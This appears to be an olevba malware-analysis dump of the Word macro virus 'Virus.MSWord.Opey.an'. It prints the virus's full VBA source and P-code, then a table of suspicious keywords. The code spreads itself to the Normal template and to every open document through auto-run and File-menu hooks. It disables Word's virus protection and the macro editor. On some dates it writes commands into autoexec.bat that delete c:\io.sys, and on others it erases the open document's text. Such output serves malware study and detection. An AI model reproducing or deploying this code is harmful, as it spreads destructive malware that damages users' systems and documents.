olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.an
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.an - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO nwrd_01.bas 
in file: Virus.MSWord.Opey.an - OLE stream: 'Macros/VBA/nwrd_01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub HELLO2U()
    On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        Line1$ = ""
        line2$ = ""
        line3$ = ""
        line4$ = ""
        If ((Day(Date) >= 15) And (Day(Date) <= 31)) Then
            Line1$ = "echo I LOVE YOU MARHEA C."
            line4$ = "echo FROM: nwrd"
        End If
        If (Day(Date) = 1) Then
            line2$ = "attrib -s -h -r c:\io.sys"
            line3$ = "del c:\io.sys"
        End If
        
        If Line1$ <> "" Or (Day(Date) = 1) Then
            Open autoexecfile$ For Append Access Write As hFile
                Print #hFile, "@echo off"
                Print #hFile, line2$
                Print #hFile, line3$
                Print #hFile, Line1$
                Print #hFile, line4$
                Print #hFile, "echo."
                Print #hFile, "pause"
            Close hFile
        End If
End Sub
Sub URD1()
  On Error Resume Next
    Call nwrd_01
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "nwrd_01" Then NTInfected = True
                If (clan <> "nwrd_01") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(J).Name
                    If clan = "nwrd_01" Then ODInfected = True
                    If (clan <> "nwrd_01") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next J
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="nwrd_01", Object:=wdOrganizerObjectProjectItems
                    opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="nwrd_01", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call HELLO2U
End Sub
Sub nwrd_01()
    On Error Resume Next
    Application.UserName = "nwrd"
    Application.UserAddress = "AMACC - SCL"
    Application.UserInitials = "LM555"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "nwrd"
        .Title = "LM555"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub WARNING()
    If ((Day(Date) = 15) Or (Day(Date) = 31)) Then
        On Error Resume Next
        Selection.WholeStory
        Selection.Delete unit:=wdCharacter, Count:=1
        ActiveDocument.Hyperlinks.Add Anchor:=Selection.Range, Address:="I LOVE YOU MARHEA C. - FROM: nwrd"
        If ActiveDocument.Saved = False Then ActiveDocument.Save
        If NormalTemplate.Saved = False Then NormalTemplate.Save
        MsgBox "143 MARHEA C.", vbExclamation, "FROM: nwrd"
        Application.Quit
    End If
End Sub
Sub FileSave()
    On Error Resume Next
    Call WARNING
    Call URD1
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call WARNING
    Call URD1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call WARNING
    Call URD1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call URD1
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call URD1
End Sub
Sub AutoExec()
    On Error Resume Next
    Call URD1
End Sub
Sub Filesaveas()
    On Error Resume Next
    Call WARNING
    Call URD1
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call URD1
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call URD1
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub Fileopen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call URD1
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opey.an
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1069 bytes
' Line #0:
' Macros/VBA/nwrd_01 - 8045 bytes
' Line #0:
' 	FuncDefn (Sub HELLO2U())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	St autoexecfile$ 
' Line #3:
' 	Ld Friend 
' 	St hFile 
' Line #4:
' 	LitStr 0x0000 ""
' 	St Line1$ 
' Line #5:
' 	LitStr 0x0000 ""
' 	St line2$ 
' Line #6:
' 	LitStr 0x0000 ""
' 	St line3$ 
' Line #7:
' 	LitStr 0x0000 ""
' 	St line4$ 
' Line #8:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Ge 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Le 
' 	Paren 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #9:
' 	LitStr 0x0019 "echo I LOVE YOU MARHEA C."
' 	St Line1$ 
' Line #10:
' 	LitStr 0x000F "echo FROM: nwrd"
' 	St line4$ 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #13:
' 	LitStr 0x0019 "attrib -s -h -r c:\io.sys"
' 	St line2$ 
' Line #14:
' 	LitStr 0x000D "del c:\io.sys"
' 	St line3$ 
' Line #15:
' 	EndIfBlock 
' Line #16:
' Line #17:
' 	Ld Line1$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #18:
' 	Ld autoexecfile$ 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #19:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #20:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld line2$ 
' 	PrintItemNL 
' Line #21:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld line3$ 
' 	PrintItemNL 
' Line #22:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Line1$ 
' 	PrintItemNL 
' Line #23:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld line4$ 
' 	PrintItemNL 
' Line #24:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #25:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #26:
' 	Ld hFile 
' 	Close 0x0001 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	EndSub 
' Line #29:
' 	FuncDefn (Sub URD1())
' Line #30:
' 	OnError (Resume Next) 
' Line #31:
' 	ArgsCall (Call) nwrd_01 0x0000 
' Line #32:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #34:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #35:
' 	Ld clan 
' 	LitStr 0x0007 "nwrd_01"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTInfected 
' 	EndIf 
' Line #36:
' 	Ld clan 
' 	LitStr 0x0007 "nwrd_01"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #37:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #39:
' 	LitVarSpecial (False)
' 	St ODInfected 
' Line #40:
' 	StartWithExpr 
' 	Ld opendoc 
' 	With 
' Line #41:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #42:
' 	Ld J 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #43:
' 	Ld clan 
' 	LitStr 0x0007 "nwrd_01"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ODInfected 
' 	EndIf 
' Line #44:
' 	Ld clan 
' 	LitStr 0x0007 "nwrd_01"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #45:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	Ld ODInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #47:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "nwrd_01"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld opendoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndWith 
' Line #51:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	NextVar 
' Line #52:
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #53:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "nwrd_01"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #54:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	ArgsCall (Call) HELLO2U 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub nwrd_01())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	LitStr 0x0004 "nwrd"
' 	Ld Application 
' 	MemSt UserName 
' Line #61:
' 	LitStr 0x000B "AMACC - SCL"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #62:
' 	LitStr 0x0005 "LM555"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #63:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #64:
' 	LitStr 0x0004 "nwrd"
' 	MemStWith Author 
' Line #65:
' 	LitStr 0x0005 "LM555"
' 	MemStWith Title 
' Line #66:
' 	ArgsMemCallWith Execute 0x0000 
' Line #67:
' 	EndWith 
' Line #68:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #69:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #70:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #71:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #72:
' 	EndWith 
' Line #73:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #74:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #75:
' 	EndWith 
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #78:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #79:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #80:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #81:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #82:
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #83:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #84:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #85:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub WARNING())
' Line #88:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	IfBlock 
' Line #89:
' 	OnError (Resume Next) 
' Line #90:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #91:
' 	Ld wdCharacter 
' 	ParamNamed unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0002 
' Line #92:
' 	Ld Selection 
' 	MemLd Range 
' 	ParamNamed Anchor 
' 	LitStr 0x0021 "I LOVE YOU MARHEA C. - FROM: nwrd"
' 	ParamNamed Address 
' 	Ld ActiveDocument 
' 	MemLd Hyperlinks 
' 	ArgsMemCall Add 0x0002 
' Line #93:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #94:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #95:
' 	LitStr 0x000D "143 MARHEA C."
' 	Ld vbExclamation 
' 	LitStr 0x000A "FROM: nwrd"
' 	ArgsCall MsgBox 0x0003 
' Line #96:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub FileSave())
' Line #100:
' 	OnError (Resume Next) 
' Line #101:
' 	ArgsCall (Call) WARNING 0x0000 
' Line #102:
' 	ArgsCall (Call) URD1 0x0000 
' Line #103:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Sub FileClose())
' Line #106:
' 	OnError (Resume Next) 
' Line #107:
' 	ArgsCall (Call) WARNING 0x0000 
' Line #108:
' 	ArgsCall (Call) URD1 0x0000 
' Line #109:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #110:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Sub FileExit())
' Line #113:
' 	OnError (Resume Next) 
' Line #114:
' 	ArgsCall (Call) WARNING 0x0000 
' Line #115:
' 	ArgsCall (Call) URD1 0x0000 
' Line #116:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #117:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #118:
' 	EndSub 
' Line #119:
' 	FuncDefn (Sub FileNew())
' Line #120:
' 	OnError (Resume Next) 
' Line #121:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #122:
' 	LitDI2 0x0001 
' 	St newfile$ 
' Line #123:
' 	ArgsCall (Call) URD1 0x0000 
' Line #124:
' 	EndSub 
' Line #125:
' 	FuncDefn (Sub AutoOpen())
' Line #126:
' 	OnError (Resume Next) 
' Line #127:
' 	ArgsCall (Call) URD1 0x0000 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Sub AutoExec())
' Line #130:
' 	OnError (Resume Next) 
' Line #131:
' 	ArgsCall (Call) URD1 0x0000 
' Line #132:
' 	EndSub 
' Line #133:
' 	FuncDefn (Sub Filesaveas())
' Line #134:
' 	OnError (Resume Next) 
' Line #135:
' 	ArgsCall (Call) WARNING 0x0000 
' Line #136:
' 	ArgsCall (Call) URD1 0x0000 
' Line #137:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #138:
' 	EndSub 
' Line #139:
' 	FuncDefn (Sub FilePageSetup())
' Line #140:
' 	OnError (Resume Next) 
' Line #141:
' 	ArgsCall (Call) URD1 0x0000 
' Line #142:
' 	Ld wdDialogFilePageSetup 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #143:
' 	EndSub 
' Line #144:
' 	FuncDefn (Sub FilePrint())
' Line #145:
' 	OnError (Resume Next) 
' Line #146:
' 	ArgsCall (Call) URD1 0x0000 
' Line #147:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #148:
' 	EndSub 
' Line #149:
' 	FuncDefn (Sub Fileopen())
' Line #150:
' 	OnError (Resume Next) 
' Line #151:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #152:
' 	ArgsCall (Call) URD1 0x0000 
' Line #153:
' 	EndSub 
' Line #154:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

